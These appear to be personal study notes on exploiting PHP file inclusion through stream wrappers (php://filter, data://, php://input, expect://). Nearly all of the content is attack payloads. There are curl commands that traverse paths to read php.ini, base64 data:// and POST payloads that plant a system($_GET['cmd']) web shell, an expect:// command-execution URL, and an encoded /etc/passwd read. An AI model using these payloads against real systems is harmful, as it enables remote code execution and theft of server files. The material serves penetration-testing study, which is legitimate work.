
allow_url_include is needed for various LFI attacks and all RFI attacks

We need to check for allow_url_include

Determine if allow_url_include is enabled (X.Y for php version)
```
/etc/php/X.Y/apache2/php.ini (Apache)
/etc/php/X.Y/fpm/php.ini (Nginx)
```


### Base64 Wrapper

Reading config file with curl
```shell-session
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini" (Apache)

curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/X.Y/fpm/php.ini"
```

### Data Wrapper

Reverse shell encoding
```shell-session
echo '<?php system($_GET["cmd"]); ?>' | base64
```

Reverse shell Payload (Can be done with curl as well)
```http
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```
### Input Wrapper

(Sending data via curl)(Must accept post request)
```shell-session
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```

**Note:** To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use `$_REQUEST`). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. `<\?php system('id')?>`)

### Expect Wrapper

Allows for commands to be ran through url streams

It's an external wrapper so we must check for it (Can be found in config)
```shell-session
extension=expect
```

Passing command through url stream
```shell-session
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

data://text/plain;base64,L2V0Yy9wYXNzd2QK